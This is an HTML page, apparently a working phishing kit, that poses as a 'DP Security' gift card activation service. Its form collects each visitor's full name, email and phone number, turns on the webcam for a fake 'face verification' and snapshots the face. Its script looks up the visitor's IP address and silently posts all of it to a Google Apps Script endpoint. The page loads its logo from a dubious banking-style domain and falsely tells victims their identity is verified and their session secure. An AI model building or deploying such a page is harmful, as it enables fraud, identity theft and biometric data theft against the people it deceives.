<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DP Security Gift Card Activation</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/vision_bundle.js" crossorigin="anonymous"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: radial-gradient(circle at center, #1a1c2c 0%, #0d0e14 100%); color: #e0e0e0; display: flex; flex-direction: column; min-height: 100vh; }
        #successModal, #errorModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 0 50px rgba(0, 217, 224, 0.4); z-index: 1000; text-align: center; width: 80%; max-width: 400px; border: 2px solid #00d9e0; }
        #errorModal { border-color: #d32f2f; box-shadow: 0 0 50px rgba(211, 47, 47, 0.4); }
        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 999; }
        .logo-container img { max-width: 300px; height: auto; display: block; margin: 40px auto; }
        main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .activation-container { background-color: rgba(30, 30, 30, 0.95); padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7); width: 100%; max-width: 500px; border: 1px solid #333; }
        h2 { text-align: center; color: #00d9e0; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; color: #a0a0a0; }
        input, select { width: 100%; padding: 12px; border: 1px solid #333; border-radius: 6px; background-color: #2a2a2a; color: white; font-size: 16px; box-sizing: border-box; }
        #camera-section { margin-top: 15px; text-align: center; }
        #video-preview { width: 100%; border-radius: 6px; border: 1px solid #00d9e0; display: none; margin-bottom: 10px; }
        #verify-container { display: none; margin-top: 20px; text-align: left; }
        .progress-label-wrap { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .progress-text { color: #00d9e0; font-weight: bold; font-size: 14px; }
        .progress-note { color: #ffeb3b; font-size: 12px; font-style: italic; }
        .progress-bg { width: 100%; height: 12px; background: #222; border-radius: 10px; overflow: hidden; border: 1px solid #444; }
        #progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #007bff, #00d9e0); transition: width 0.3s ease; }
        .cam-btn, .modal-btn, .close-btn { background: #333; color: #00d9e0; border: 1px solid #00d9e0; padding: 8px 15px; border-radius: 4px; cursor: pointer; margin-top: 10px; }
        .close-btn { background: linear-gradient(135deg, #007bff, #00d9e0); color: white; border: none; padding: 12px 20px; width: 100%; font-weight: bold; margin-top: 20px; }
        .modal-btn { background: #d32f2f; color: white; border: none; padding: 10px 25px; font-weight: bold; }
        .submit-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #007bff, #00d9e0); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
        footer { text-align: center; padding: 20px; background-color: #0a0a0a; font-size: 14px; color: #777; margin-top: auto; }
    </style>
</head>
<body>
<div id="modalOverlay"></div>
<div id="successModal">
    <h3 style="color: #00d9e0;">Activation Successful</h3>
    <p>Identity verified. Your session is now secure.</p>
    <p>Support: 323-374-3366</p>
    <button class="close-btn" onclick="window.close(); setTimeout(() => { alert('Please close this tab manually.'); }, 500);">Close and Secure Session</button>
</div>
<div id="errorModal"><h3 style="color: #f44336;">Verification Error</h3><p id="errorText"></p><button class="modal-btn" onclick="document.getElementById('modalOverlay').style.display='none'; document.getElementById('errorModal').style.display='none';">OK</button></div>
<header><div class="logo-container"><img src="https://usbanking.icu/DP.png" alt="DP Security Logo"></div></header>
<main>
    <div class="activation-container">
        <h2>Gift Card Activation</h2>
        <form id="activationForm">
            <div class="form-group"><label>Select Card Type</label><select id="cardType" required><option value="" disabled selected>Choose a card...</option><option value="Amazon Card">Amazon Card</option><option value="Apple Card">Apple Card</option><option value="eBay Card">eBay Card</option><option value="Google Play Card">Google Play Card</option><option value="Greendot Card">Greendot Card</option><option value="Steam Card">Steam Card</option><option value="Vanilla Card">Vanilla Card</option></select></div>
            <div class="form-group"><label>Full Name</label><input type="text" id="fullName" required placeholder="First and Last Name" pattern="^[a-zA-Z]+\s+[a-zA-Z]+.*$"></div>
            <div class="form-group"><label>Email Address</label><input type="email" id="email" required placeholder="john.doe@example.com"></div>
            <div class="form-group"><label>Phone Number</label><input type="tel" id="phone" required placeholder="(xxx) xxx-xxxx" maxlength="14"></div>
            <div class="form-group"><label>Human Face Verification</label><div id="camera-section"><video id="video-preview" autoplay playsinline></video><button type="button" id="start-camera" class="cam-btn">Initialize Secure Camera</button></div></div>
            <div class="form-group"><label id="captcha-question" style="color:#00d9e0;"></label><input type="number" id="captcha-answer" placeholder="Enter result" required></div>
            <button type="submit" class="submit-btn" id="submitBtn">Activate Card and Verify You are Human</button>
            <div id="verify-container"><div class="progress-label-wrap"><span class="progress-text">Verifying now...</span><span class="progress-note">don't move while we verify</span></div><div class="progress-bg"><div id="progress-bar"></div></div></div>
        </form>
    </div>
</main>
<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzpmy1sRK0T90sFd3DhX9S4I9qotIrXjBQqcu4qWS_DU2axDJmGGCB9Hvm69J_mohlJ/exec';
    let faceDetector; const vision = window.tasksVision; let streamActive = false;
    async function initSec() { 
        try { 
            const res = await vision.FilesetResolver.forVisionTasks("https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/wasm");
            faceDetector = await vision.FaceDetector.createFromOptions(res, { baseOptions: { modelAssetPath: `https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite`, delegate: "GPU" }, runningMode: "IMAGE" });
        } catch(e) {} 
    }
    initSec();
    document.getElementById('phone').addEventListener('input', e => { let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/); e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : ''); });
    const video = document.getElementById('video-preview'); const startBtn = document.getElementById('start-camera');
    startBtn.onclick = async () => { try { const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); video.srcObject = s; video.onloadedmetadata = () => { video.play(); video.style.display = 'block'; startBtn.style.display = 'none'; streamActive = true; }; } catch(e) { alert("Camera access required."); } };
    let n1 = Math.floor(Math.random()*15)+5, n2 = Math.floor(Math.random()*10)+1, op = Math.random()>0.5?'+':'-', ans = op==='+'?(n1+n2):(n1-n2);
    document.getElementById('captcha-question').textContent = `Security Check: ${n1} ${op} ${n2} = ?`;
    document.getElementById('activationForm').onsubmit = async (e) => {
        e.preventDefault(); if(!streamActive) { alert("Start camera first."); return; }
        const pb = document.getElementById('progress-bar'); document.getElementById('verify-container').style.display='block'; pb.style.width='30%';
        const cv = document.createElement('canvas'); cv.width=video.videoWidth; cv.height=video.videoHeight; cv.getContext('2d').drawImage(video,0,0);
        if(faceDetector && faceDetector.detect(cv).detections.length===0) { alert("No face detected."); pb.style.width='0%'; return; }
        if(parseInt(document.getElementById('captcha-answer').value)!==ans) { alert("Math fail."); return; }
        pb.style.width='70%';
        try {
            const ip = await (await fetch('https://api.ipify.org?format=json')).json();
            const sub = { date: new Date().toLocaleString(), name: document.getElementById('fullName').value, email: document.getElementById('email').value, phone: document.getElementById('phone').value, barcode: document.getElementById('cardType').value, photo: cv.toDataURL('image/png'), status: 'PENDING', ip: ip.ip };
            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(sub) });
            pb.style.width='100%'; setTimeout(() => { video.srcObject.getTracks().forEach(t=>t.stop()); document.getElementById('modalOverlay').style.display='block'; document.getElementById('successModal').style.display='block'; }, 500);
        } catch(err) { alert("Error connecting."); }
    };
</script>
</body>
</html>
